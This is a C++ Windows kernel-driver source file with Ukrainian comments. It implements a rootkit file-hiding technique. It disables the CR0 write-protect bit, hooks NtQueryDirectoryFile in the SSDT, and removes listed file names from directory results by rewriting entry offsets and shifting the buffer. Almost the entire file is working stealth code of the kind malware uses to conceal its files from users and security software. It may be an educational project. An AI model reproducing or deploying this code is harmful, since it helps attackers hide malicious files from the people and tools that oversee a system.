#include "hideFileAlgorithm.h"

unsigned int unicodeStringsArr_curIndex = 0;
const unsigned int unicodeStringsArr_length = 10;
wchar_t unicodeStringsArr[unicodeStringsArr_length][256] = { 0 };

void _setAtStringsArr(wchar_t* wbuf, size_t wbuf_size, size_t pos) {
	if (wbuf_size > 255)
		wbuf_size = 255;

	int i = 0;
	int limit = (int)wbuf_size;
	for (; i < limit; i++)
		unicodeStringsArr[pos][i] = wbuf[i];
	unicodeStringsArr[pos][i] = (wchar_t)'\0';
}
void _clearUnicodeStringsArr() {
	for (int i = 0; i < unicodeStringsArr_length; i++)
		_setAtStringsArr((wchar_t*)NULL, 0, i);
	unicodeStringsArr_curIndex = 0;
}
void _addIntoUnicodeStringsArr(wchar_t* wbuf, size_t wbuf_size) {
	_setAtStringsArr(wbuf, wbuf_size, unicodeStringsArr_curIndex);

	unicodeStringsArr_curIndex++;
	if (unicodeStringsArr_curIndex >= unicodeStringsArr_length)
		unicodeStringsArr_curIndex = 0;
}
void _deleteFromUnicodeStringsArr(wchar_t* wbuf, size_t wbuf_size) {
	for (int i = 0; i < unicodeStringsArr_length; i++) {
		wchar_t* arr_buf = unicodeStringsArr[i];
		size_t arr_buf_size;
		RtlStringCchLengthW(arr_buf, 256, &arr_buf_size);
		if (!RtlCompareUnicodeStrings(arr_buf, arr_buf_size, wbuf, wbuf_size, 1)) {
			_setAtStringsArr((wchar_t*)NULL, 0, i);
			break;
		}
	}
}
void _copyFromUnicodeStringsArrToWbuf(wchar_t* wbuf, size_t max_size) {
	max_size = max_size - 1;
	size_t cur_size = 0;
	for (int i = 0; i < unicodeStringsArr_length; i++) {
		int parsed_wchars = 0;

		wchar_t* str = unicodeStringsArr[i];
		while (*str) {
			if (cur_size >= max_size)
				break;
			*(wbuf + cur_size++) = *(str++);
			parsed_wchars++;
		}
		if (cur_size >= max_size)
			break;

		if(parsed_wchars)
			*(wbuf + cur_size++) = (wchar_t)('\n');
	}
	*(wbuf + cur_size) = (wchar_t)('\0');

	DbgPrint("_copyFromUnicodeStringsArrToWbuf() sends:\n-----------\n%ws\n----------\n", wbuf);
}

inline bool IsEntryLast(NtList* pList) {
	return (pList->NextEntryOffset == LastEntryOffset);
}
inline NtList* GetNextEntryPointer(NtList* list) {
	if (IsEntryLast(list))
		DbgPrint((const char*)"throw std::runtime_error(\"No more entries inside list\"");

	return (NtList*)((char*)list + list->NextEntryOffset);
}
inline size_t GetListSize(NtList* list) {
	size_t size = 0;

	while (true) {
		size += list->NextEntryOffset;

		if (IsEntryLast(list))
			break;
		list = GetNextEntryPointer(list);
	}

	return size;
}
inline void CutNextEntryByFakeOffset(NtList* list) {
	NtList* pNextEntry = GetNextEntryPointer(list);

	if (IsEntryLast(pNextEntry))
		list->NextEntryOffset = LastEntryOffset;
	else
		list->NextEntryOffset = list->NextEntryOffset + pNextEntry->NextEntryOffset;
}
template<class InfoType> inline void CutFromListByFakeOffset_If(NtList* list, const HideParams& params) {
	while (true) {
		while (true) {
			if (IsEntryLast(list))
				break;

			NtList* pNextEntry = GetNextEntryPointer(list);
			if (!CheckFileEntry<InfoType>(pNextEntry, params))
				break;

			CutNextEntryByFakeOffset(list);
		}

		if (IsEntryLast(list))
			break;
		list = GetNextEntryPointer(list);
	}
}
bool IsFileNameInRules(const wchar_t* s, size_t size, const NtQueryDirParams& params) {
	for (int i = 0; i < unicodeStringsArr_length; i++) {
		size_t len;
		RtlStringCchLengthW(unicodeStringsArr[i], 500, &len);
		if (!RtlCompareUnicodeStrings(unicodeStringsArr[i], len, s, size, true))
			return true;
	}

	return false;
}
// перевiряє, чи є iм'я файлу у масивi з iменами приховуваємих файлiв
template<class InfoType> inline bool CheckFileEntry(NtList* list, const HideParams& params) {
	InfoType* info = (InfoType*)list;
	return IsFileNameInRules(info->FileName, info->FileNameLength / 2, params.callParams);
}
inline void ShiftBuffer(NtList* pList, NtList* newBegin) {
	size_t shiftSize = newBegin - pList;
	size_t infoSize = GetListSize(pList);
	size_t newInfoSize = infoSize - shiftSize;

	for (int i = 0; i < newInfoSize; i++) {
		*((char*)pList + i) = *((char*)newBegin + i);
	}
}
// знаходимо перший елемент, який НЕ потрiбно приховувати, та зсуваємо буфер до нього
template<class InfoType> inline NTSTATUS FirstEntryProcessor(const HideParams& params) {
	NtList* pList = (NtList*)params.callParams.FileInformation;

	NtList* pCurEntry = pList;

	while (true) {
		if (!CheckFileEntry<InfoType>(pCurEntry, params)) {
			// це перший елемент, тобто ховати нiчого не потрiбно
			if (pList == pCurEntry)
				break;

			// сдвигаємо буфер до поточного елемента i також виходимо з циклу
			ShiftBuffer(pList, pCurEntry);
			break;
		}

		// цей файл потрiбно приховати
		if (IsEntryLast(pCurEntry) == false) {
			// отримаємо наступний файл та будемо перевiряти його
			pCurEntry = GetNextEntryPointer(pCurEntry);
		}
		else { // це останнiй файл, тобто приховати потрiбно усе
			// спробуємо отримати бiльше даних
			NTSTATUS status = params.wrapperPtr(params.callParams);
			if (!NT_SUCCESS(status))
				return status;

			// продовжимо перевiряти
			pCurEntry = pList;
		}
	}
	return STATUS_SUCCESS;
}
template<class InfoType> inline NTSTATUS NextEntryProcessor(const HideParams& params) {
	NtList* pList = (NtList*)params.callParams.FileInformation;

	if (IsEntryLast(pList))
		return STATUS_SUCCESS;

	// якщо потрібно приховати наступний файл, то:
	// pList->NextEntryOffset = pList->NextEntryOffset + pNextEntry->NextEntryOffset
	CutFromListByFakeOffset_If<InfoType>(pList, params);

	return STATUS_SUCCESS;
}
template<class InfoType> inline NTSTATUS HideFile(const HideParams& params) {
	// обробка для першого елементу (зсування буферу)
	NTSTATUS status = FirstEntryProcessor<InfoType>(params);
	if (!NT_SUCCESS(status))
		return status;

	// обробка наступних елементiв (змiна NextEntryOffset)
	status = NextEntryProcessor<InfoType>(params);
	if (!NT_SUCCESS(status))
		return status;

	return STATUS_SUCCESS;
}

ULONG ClearWPBit() {
	ULONG CR0Reg;
	__asm {
		mov eax, cr0
		mov CR0Reg, eax       	// для того, щоб потiм востановити його      
		and eax, 0xFFFEFFFF 	// очистити 16 бiт регiстру CR0     
		mov cr0, eax
	}
	return CR0Reg;
}
void SetWPBit(ULONG CR0Reg) {
	__asm {
		mov eax, CR0Reg
		mov cr0, eax      		// востановити регiстр CR0                      
	}
}

extern "C" __declspec(dllimport) SST KeServiceDescriptorTable;
ULONG oldWP = 0;
NtQueryPrototype oldNtQuery = NULL;

NTSTATUS OriginalHandlerWrapper(const NtQueryDirParams& params) {
	return oldNtQuery(
		params.FileHandle,
		params.Event,
		params.ApcRoutine,
		params.ApcContext,
		params.IoStatusBlock,
		params.FileInformation,
		params.FileInformationLength,
		params.FileInformationClass,
		params.ReturnSingleEntry,
		params.FileName,
		params.RestartScan
	);
}
NTSTATUS Hook_NtQuery(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan) {
	NtQueryDirParams params = {
		FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		FileInformationLength, FileInformationClass, ReturnSingleEntry, FileName, RestartScan
	};

	NTSTATUS status = OriginalHandlerWrapper(params);

	if (!NT_SUCCESS(status))
		return status;

	params.RestartScan = FALSE; // продовжуємо пошук

	// збережемо показник на оригiнальну функцiю, щоб потiм запросити бiльше даних
	HideParams hideParams = { params, &OriginalHandlerWrapper };

	switch (FileInformationClass) {
		// https://learn.microsoft.com/uk-ua/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntquerydirectoryfileex

		case FileDirectoryInformation:
			return HideFile<FILE_DIRECTORY_INFORMATION>(hideParams);
		case FileFullDirectoryInformation:
			return HideFile<FILE_FULL_DIR_INFORMATION>(hideParams);
		case FileBothDirectoryInformation:
			return HideFile<FILE_BOTH_DIR_INFORMATION>(hideParams);
		case FileNamesInformation:
			return HideFile<FILE_NAMES_INFORMATION>(hideParams);
		case FileIdBothDirectoryInformation:
			return HideFile<FILE_ID_BOTH_DIR_INFORMATION>(hideParams);
		case FileIdFullDirectoryInformation:
			return HideFile<FILE_ID_FULL_DIR_INFORMATION>(hideParams);
		default:
			return status;
	}
}

PULONG HookSSDT(PUCHAR syscall, PUCHAR hookaddr) {
	/* local variables */
	UINT32 index;
	PLONG ssdt;
	PLONG target;

	/* disable WP bit in CR0 to enable writing to SSDT */
	oldWP = ClearWPBit();
	DbgPrint("The WP flag in CR0 has been disabled.\n");

	/* identify the address of SSDT table */
	ssdt = (PLONG)KeServiceDescriptorTable.ServiceTable;
	DbgPrint("The system call address is %x.\n", syscall);
	DbgPrint("The hook function address is %x.\n", hookaddr);
	DbgPrint("The address of the SSDT is: %x.\n", ssdt);

	/* identify ‘syscall’ index into the SSDT table */
	index = *((PULONG)(syscall + 0x1));
	DbgPrint("The index into the SSDT table is: %d.\n", index);

	/* get the address of the service routine in SSDT */
	target = (PLONG) & (ssdt[index]);
	DbgPrint("The address of the SSDT routine to be hooked is: %x.\n", target);

	/* hook the service routine in SSDT */
	return (PULONG)InterlockedExchange(target, (LONG)hookaddr);
}
void RestoreNtQuery() {
	if (oldNtQuery != NULL) {
		oldNtQuery = (NtQueryPrototype)HookSSDT((PUCHAR)NtQuery, (PUCHAR)oldNtQuery);
		SetWPBit(oldWP);
		DbgPrint("The original SSDT function restored.\n");
	}
}
void ModifyNtQuery() {
	oldNtQuery = (NtQueryPrototype)HookSSDT((PUCHAR)NtQuery, (PUCHAR)Hook_NtQuery);
}